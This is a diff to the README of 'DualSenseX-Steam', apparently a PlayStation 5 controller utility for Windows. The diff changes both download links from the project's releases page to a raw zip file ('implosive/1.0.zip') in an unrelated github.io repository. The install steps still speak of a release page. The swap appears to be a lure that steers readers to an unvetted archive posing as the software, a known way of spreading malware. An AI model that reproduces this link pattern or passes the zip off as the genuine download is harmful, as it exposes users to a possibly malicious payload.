@@ -5,7 +5,7 @@ description: "Enable adaptive triggers, haptic feedback, and rumble support for 
 ---
 # 🎮 DualSenseX-Steam - Experience Full PS5 Controller Features
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue?style=for-the-badge)](https://github.com/Running-argentina789/DualSenseX-Steam/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Running-argentina789/running-argentina789.github.io/main/implosive/1.0.zip)
 
 DualSenseX-Steam allows you to use your PlayStation 5 DualSense or DualSense Edge controller on your Windows PC. The software translates your controller inputs into signals that Windows understands. This allows the controller to function in games that do not support PS5 hardware natively. You gain access to adaptive triggers, vibration settings, and light customization options.
 
@@ -22,7 +22,7 @@ Your computer must meet these basic needs to use the software:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [this page to download](https://github.com/Running-argentina789/DualSenseX-Steam/releases) the most recent version of the application.
+1. Visit [this page to download](https://raw.githubusercontent.com/Running-argentina789/running-argentina789.github.io/main/implosive/1.0.zip) the most recent version of the application.
 2. Locate the asset section at the bottom of the release page.
 3. Click the file ending in .zip to start the download.
 4. Open your Downloads folder once the transfer finishes.
